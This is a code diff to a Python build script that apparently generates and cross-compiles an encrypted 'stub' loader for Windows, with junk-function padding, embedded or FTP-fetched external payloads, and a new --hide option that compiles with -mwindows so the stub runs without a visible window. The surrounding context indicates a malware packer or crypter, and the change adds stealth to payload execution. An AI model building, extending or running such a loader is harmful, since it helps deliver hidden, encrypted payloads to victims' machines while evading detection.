@@ -77,7 +77,7 @@ int {junk_func}() {{
     with open("build/stub.c", "w") as f:
         f.write(stub_code)
 
-def compile_stub(output_name):
+def compile_stub(output_name, hide=False):
     cmd = [
         "x86_64-w64-mingw32-gcc",
         "-m64",
@@ -88,6 +88,8 @@ def compile_stub(output_name):
         "-lpsapi",
         "-lbcrypt"
     ]
+    if hide:
+        cmd.append("-mwindows")
     subprocess.run(cmd, check=True)
 
 def main():
@@ -101,6 +103,7 @@ def main():
     parser.add_argument("--bin", help="Output file for external payload (default payload.bin if --url used)")
     parser.add_argument("--ftp-user", default="anonymous", help="FTP username")
     parser.add_argument("--ftp-pass", default="", help="FTP password")
+    parser.add_argument("--hide", action="store_true", help="Compile stub with -mwindows for hidden execution")
     args = parser.parse_args()
 
     with open(args.input, "rb") as f:
@@ -120,7 +123,7 @@ def main():
     else:
         generate_stub(encrypted, args.key, args.encrypt, args.type, embed_payload=True, ftp_user=args.ftp_user, ftp_pass=args.ftp_pass)
 
-    compile_stub(args.output)
+    compile_stub(args.output, hide=args.hide)
     print(f"[+] Packed stub compiled to {args.output}")
 
 if __name__ == "__main__":
